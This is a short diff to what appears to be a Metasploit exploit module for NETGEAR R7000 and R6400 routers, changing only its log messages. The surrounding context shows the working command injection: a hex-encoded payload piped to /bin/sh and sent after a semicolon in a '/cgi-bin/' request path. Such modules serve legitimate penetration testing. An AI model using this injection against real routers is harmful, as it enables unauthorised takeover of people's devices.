@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Exploit::Remote
       marker_one = "Basic realm=\""
       marker_two = "\""
       model = scrape(data, marker_one, marker_two)
-      print_status("Router is a NETGEAR router (#{model})")
+      vprint_status("Router is a NETGEAR router (#{model})")
       if model == 'NETGEAR R7000' || model == 'NETGEAR R6400'
         print_good("Router could be vulnerable (NETGEAR #{model})")
         return CheckCode::Detected
@@ -84,7 +84,8 @@ class MetasploitModule < Msf::Exploit::Remote
     cmd = payload.encoded.unpack("C*").map{|c| "\\x%.2x" % c}.join
     str = "echo${IFS}-ne${IFS}\"#{cmd}\"|/bin/sh&"
 
-    print_status("Sending GET request with encoded command line...")
+    print_status("Sending encoded command...")
+    vprint_status("Encoded command: #{str}")
     send_request_raw({ 'uri' => "/cgi-bin/;#{str}" })
 
     print_status("Giving the handler time to run...")
